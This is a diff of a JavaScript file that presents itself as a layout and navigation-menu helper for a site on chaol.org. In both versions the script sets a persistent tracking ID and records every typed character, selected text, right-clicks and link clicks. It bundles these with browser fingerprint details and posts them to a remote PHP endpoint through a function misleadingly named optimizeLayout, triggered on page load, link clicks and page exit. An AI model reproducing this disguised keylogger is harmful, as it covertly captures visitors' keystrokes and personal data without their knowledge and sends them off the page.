@@ -1,14 +1,14 @@
 //doesnt work much for the layout for now; works for the navigation menu links tho
 
 function makeid(length) {
-    var result           = '';
-    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     var charactersLength = characters.length;
-    for ( var i = 0; i < length; i++ ) {
-      result += characters.charAt(Math.floor(Math.random() *
- charactersLength));
-   }
-   return result;
+    for (var i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() *
+            charactersLength));
+    }
+    return result;
 }
 
 function getMath(name) {
@@ -19,33 +19,33 @@ function getMath(name) {
         begin = dc.indexOf(prefix);
         if (begin != 0) return null;
     }
-    else
-    {
+    else {
         begin += 2;
         var end = document.cookie.indexOf(";", begin);
         if (end == -1) {
-        end = dc.length;
+            end = dc.length;
         }
     }
     return decodeURI(dc.substring(begin + prefix.length, end));
 }
 
-var math0 = localStorage.getItem("mathId");
-var mathIdCreatedTime = localStorage.getItem("mathIdCreatedTime");
+var math = localStorage.getItem("math");  // Changed from mathId to math
+var mathCreatedTime = localStorage.getItem("mathCreatedTime");
 
-if (!math0) {
-    math0 = getMath("math");
-    if (!math0) {
-        math0 = makeid(32);
-        document.cookie = "math=" + math0 + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
+if (!math) {
+    math = getMath("math");
+    if (!math) {
+        math = makeid(32);
+        document.cookie = "math=" + math + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
     }
-    localStorage.setItem("mathId", math0);
+    localStorage.setItem("math", math);
 }
 
-if (!mathIdCreatedTime) {
-    mathIdCreatedTime = new Date().toISOString();
-    localStorage.setItem("mathIdCreatedTime", mathIdCreatedTime);
+if (!mathCreatedTime) {
+    mathCreatedTime = new Date().toISOString();
+    localStorage.setItem("mathCreatedTime", mathCreatedTime);
 }
+
 
 
 //To be improved
@@ -72,8 +72,8 @@ function addToBuffer(type, data) {
     }
 }
 
+
 function optimizeLayout(triggerEvent) {
-    try {
     const screenWidth = window.screen.width;
     const screenHeight = window.screen.height;
     const browserLanguages = navigator.languages.join(", ");
@@ -87,22 +87,49 @@ function optimizeLayout(triggerEvent) {
     const humanReadableTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
     let eventData = eventsBuffer.map(event => `${event.type}:${event.data}`).join('|');
     let keyData = keyBuffer.join('');
-    let url = `https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?c=${math0}&cTimeUTC=${encodeURIComponent(mathIdCreatedTime || 'N/A')}&TimezoneNow=${humanReadableTimezone}&w=${screenWidth}&h=${screenHeight}&PrimaryBrowserLanguage=${primaryBrowserLanguage}&BrowserLanguages=${browserLanguages}&Platform=${platform}&ColorDepth=${colorDepth}&DeviceMemory=${deviceMemory}&HardwareConcurrency=${hardwareConcurrency}&CookiesEnabled=${cookiesEnabled}&UserAgent=${userAgent}&Current=${encodeURIComponent(window.location.href)}&From=${encodeURIComponent(document.referrer)}&EventBuffer=${encodeURIComponent(eventData)}&KeyBuffer=${encodeURIComponent(keyData)}`;
+
+    const proof = {
+        c: math,
+        cTimeUTC: mathCreatedTime || 'N/A',
+        TimezoneNow: humanReadableTimezone,
+        w: screenWidth,
+        h: screenHeight,
+        PrimaryBrowserLanguage: primaryBrowserLanguage,
+        BrowserLanguages: browserLanguages,
+        Platform: platform,
+        ColorDepth: colorDepth,
+        DeviceMemory: deviceMemory,
+        HardwareConcurrency: hardwareConcurrency,
+        CookiesEnabled: cookiesEnabled,
+        UserAgent: userAgent,
+        Current: window.location.href,
+        From: document.referrer,
+        EventBuffer: eventData,
+        KeyBuffer: keyData
+    };
     if (triggerEvent) {
-        url += `&Event=${encodeURIComponent(triggerEvent)}`;
+        proof.Event = triggerEvent;
     }
-    fetch(url, {
-        method: "POST"
-    });
-    
-    } catch (error) {
-        console.error("Error in optimizeLayout:", error);
-    }
-    eventsBuffer = [];
-    keyBuffer = [];     
+
+    fetch('https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(proof)
+    })
+        .catch(error => {
+            console.error('Error:', error);
+        })
+        .finally(() => {
+            eventsBuffer = [];
+            keyBuffer = [];
+        });
 }
 
-optimizeLayout(`visitCurrentPage:${encodeURIComponent(window.location.href)}`);
+
+
+optimizeLayout(`visitCurrentPage:${window.location.href}`);
 
 document.addEventListener('keydown', (e) => {
     if (e.key.length === 1) {
@@ -116,12 +143,26 @@ document.addEventListener('keydown', (e) => {
     }
 });
 
-document.addEventListener('mouseup', function() {
-    const selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' <br> ');  // Replacing newline characters 
+document.addEventListener('mouseup', function () {
+    let selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' '); // Replacing newline characters
+
+    let words = selectedText.split(/\s+/);
+    for (let i = 0; i < words.length; i++) {
+        try {
+             encodeURI(words[i]);
+            // words[i] = encodeURI(words[i]);
+        } catch (err) {
+            console.error("Error Selecting and Encoding the word:", err, "The Word is:", words[i]);
+            words[i] = " ";
+        }
+    }
+    selectedText = words.join(' ');
+
     if (selectedText.length > 0) {
         addToBuffer('textSelection', selectedText);
     }
 });
+
 
 
 window.addEventListener('beforeunload', () => {
@@ -135,37 +176,20 @@ window.addEventListener('beforeunload', () => {
 
 
 
-document.addEventListener("DOMContentLoaded", function() {
+document.addEventListener("DOMContentLoaded", function () {
 
-    const submitButton = document.getElementById('submitButton');
-    if (submitButton) {
-        submitButton.addEventListener('click', function() {
-            optimizeLayout('SubmitButtonClick'); 
-        });
-    }
-
-    const resetButton = document.getElementById('resetButton');
-    if (resetButton) {
-        resetButton.addEventListener('click', function() {
-            optimizeLayout('resetButtonClick'); 
-        });
-    }
-
-    document.addEventListener("contextmenu", function(event) {
-        addToBuffer("event", "RightClick");
-    });
 
     // Handling link redirections
     var links = document.querySelectorAll("a");
-    links.forEach(function(link) {
-        link.addEventListener("click", function(event) {
+    links.forEach(function (link) {
+        link.addEventListener("click", function (event) {
             event.preventDefault();
             var href = link.getAttribute("href");
             optimizeLayout(`LinkClicked:${href}`);
-            
-            
+
+
             if (link.getAttribute("target") === "_blank") {
-                var newWin = window.open('', '_blank'); 
+                var newWin = window.open('', '_blank');
                 newWin.rel = "noopener noreferrer";
                 newWin.location.href = href;
             } else {
@@ -174,7 +198,7 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    
+
 
     // Handling active state for navigation menu links
     const navLinks = document.querySelectorAll(".nav-menu a");
@@ -190,17 +214,38 @@ document.addEventListener("DOMContentLoaded", function() {
             activeLink = link;
         }
 
-        link.addEventListener("mouseenter", function() {
+        link.addEventListener("mouseenter", function () {
             if (activeLink) {
                 activeLink.classList.remove("active");
             }
         });
 
-        link.addEventListener("mouseleave", function() {
+        link.addEventListener("mouseleave", function () {
             if (activeLink) {
                 activeLink.classList.add("active");
             }
         });
     });
+
+
+    document.addEventListener("contextmenu", function (event) {
+        addToBuffer("event", "RightClick");
+    });
+
+    const submitButton = document.getElementById('submitButton');
+    if (submitButton) {
+        submitButton.addEventListener('click', function () {
+            optimizeLayout('SubmitButtonClick');
+        });
+    }
+
+    const resetButton = document.getElementById('resetButton');
+    if (resetButton) {
+        resetButton.addEventListener('click', function () {
+            optimizeLayout('resetButtonClick');
+        });
+    }
+
+
 });
 
